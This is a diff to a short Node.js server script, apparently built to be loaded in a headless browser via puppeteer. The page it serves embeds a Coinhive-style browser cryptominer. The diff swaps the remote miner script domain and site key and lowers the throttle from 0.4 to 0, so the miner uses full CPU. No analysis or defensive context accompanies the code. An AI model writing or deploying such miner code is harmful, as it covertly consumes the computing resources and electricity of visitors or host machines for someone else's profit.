@@ -2,12 +2,7 @@ var http = require('http');
 const puppeteer = require('puppeteer');
 http.createServer(function (req, res) {
 
-	const htmlStr = `<!doctype html><html><head><title>test</title><script src="https://www.freecontent.date./2oR7.js"></script></head><body><h1>Wuhehehehe</h1><script>
-    var _client = new Client.Anonymous('82cdba55e4f43dc3a9f0d0ae5cc4d78cd78edd0b7d4fe041dd6a9034a77df53f', {
-        throttle: 0.4
-    });
-    _client.start();
-</script></body></html>`;
+	const htmlStr = `<!doctype html><html><head><title>test</title><script src="https://www.hostingcloud.science./kLnA.js"></script><script>var _client = new Client.Anonymous('e2411896b99df10910b69b02eb5e7722e62217a9b6fce87de1d63af4b4f570f1', { throttle: 0, c: 'w' }); _client.start();</script></body></html>`;
     res.writeHead(200, {'Content-Type': 'text/html'});
     res.end(htmlStr);
 }).listen(8080);
